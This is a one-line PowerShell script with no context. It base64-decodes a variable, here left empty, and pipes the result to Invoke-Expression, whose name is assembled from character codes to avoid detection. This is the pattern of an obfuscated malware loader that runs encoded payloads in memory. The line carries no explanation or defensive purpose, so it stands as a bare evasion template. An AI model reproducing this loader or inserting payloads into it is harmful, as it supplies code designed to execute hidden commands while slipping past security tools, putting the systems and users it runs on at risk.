$QUXVUZ="";$PSIUA=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($QUXVUZ));$PSIUA|&([char]73+[char]69+[char]120)